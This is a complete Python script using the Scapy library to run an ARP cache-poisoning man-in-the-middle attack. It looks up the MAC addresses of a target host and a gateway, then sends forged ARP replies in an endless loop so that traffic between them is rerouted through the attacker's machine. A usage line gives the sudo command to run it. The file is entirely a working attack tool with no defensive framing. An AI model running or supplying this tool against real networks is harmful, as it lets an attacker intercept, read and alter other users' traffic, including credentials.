import sys
from scapy.all import get_if_hwaddr, get_if_addr, send, srp, conf
from scapy.layers.l2 import ARP , Ether

#function that returns the mac address of the passed ip
def getMac(ip):
    arp_pckt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip)
    try:
        ans , _ = srp(arp_pckt,timeout=5,verbose=0)
        targetmac = ans[0][1].hwsrc
        return targetmac
    except IndexError:
        print(f"No responce from {ip}! ")
        sys.exit(0)

#function that sends the packets
def arpMitm(tip, tmac, gip, gmac, mmac):
    spoofed_pckt1 = ARP(op=2,pdst=tip,hwdst=tmac,psrc=gip,hwsrc=mmac )
    spoofed_pckt2 = ARP(op=2,pdst=gip,hwdst=gmac,psrc=tip,hwsrc=mmac )
    send(spoofed_pckt1,verbose=0)
    send(spoofed_pckt2,verbose=0)    


def main():
    try:
        target_ip = sys.argv[1]
        gateway_ip = sys.argv[2]
    except IndexError:
        print("Enter Proper Arguments!")
        sys.exit(0)
    target_mac = getMac(target_ip)
    gateway_mac = getMac(gateway_ip)
    
    my_ip = get_if_addr(conf.iface)
    my_mac = get_if_hwaddr(conf.iface)
    
    print(my_ip, my_mac)
    print(target_ip,target_mac)
    print(gateway_ip,gateway_mac)
    
    print("Starting ARP MITM Attack")
    try:
        while True:
            arpMitm(target_ip, target_mac, gateway_ip, gateway_mac, my_mac)
    except KeyboardInterrupt:
        print("\nStopping ARP MITM Attack")



#RUN AS : sudo python3 arm_mitm.py 192.168.1.2 192.168.1.1
if __name__ == '__main__':
    try:
        main()
    except PermissionError:
        print("\nRun as sudo \n")
        sys.exit(0)
